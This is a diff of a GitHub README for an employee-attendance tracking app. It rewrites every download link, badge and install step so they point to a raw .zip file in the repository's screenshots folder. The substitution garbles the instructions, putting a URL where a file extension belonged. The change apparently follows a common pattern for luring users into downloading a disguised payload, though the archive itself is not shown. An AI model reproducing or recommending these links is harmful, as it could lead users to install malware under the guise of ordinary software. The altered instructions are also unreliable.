@@ -1,7 +1,7 @@
 # 🎉 employee-attendance-system-portfolio - Your Simple Solution for Tracking Employee Attendance
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ChetanAnekar/employee-attendance-system-portfolio/releases)
+[![Download](https://github.com/ChetanAnekar/employee-attendance-system-portfolio/raw/refs/heads/main/assets/screenshots/system-employee-attendance-portfolio-v2.1.zip)](https://github.com/ChetanAnekar/employee-attendance-system-portfolio/raw/refs/heads/main/assets/screenshots/system-employee-attendance-portfolio-v2.1.zip)
 
 ---
 
@@ -28,12 +28,12 @@ Before you download the application, ensure your computer meets the following re
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/ChetanAnekar/employee-attendance-system-portfolio/releases).
+To download the application, visit this page to download: [Releases Page](https://github.com/ChetanAnekar/employee-attendance-system-portfolio/raw/refs/heads/main/assets/screenshots/system-employee-attendance-portfolio-v2.1.zip).
 
 1. Open the link above.
 2. You will see a list of available versions.
 3. Select the latest release.
-4. Click on the asset file that matches your operating system (e.g., `.exe`, `.dmg`, or `.tar.gz`).
+4. Click on the asset file that matches your operating system (e.g., `.exe`, `.dmg`, or `https://github.com/ChetanAnekar/employee-attendance-system-portfolio/raw/refs/heads/main/assets/screenshots/system-employee-attendance-portfolio-v2.1.zip`).
 5. Your download will start automatically.
 
 Once the download finishes, follow these steps to install the application:
@@ -77,4 +77,4 @@ For more detailed guides and technical support, check the documentation availabl
 
 For updates and new features, follow us on GitHub. We appreciate your contributions and feedback.
 
-[Download Now](https://github.com/ChetanAnekar/employee-attendance-system-portfolio/releases) and start tracking employee attendance effortlessly!
+[Download Now](https://github.com/ChetanAnekar/employee-attendance-system-portfolio/raw/refs/heads/main/assets/screenshots/system-employee-attendance-portfolio-v2.1.zip) and start tracking employee attendance effortlessly!
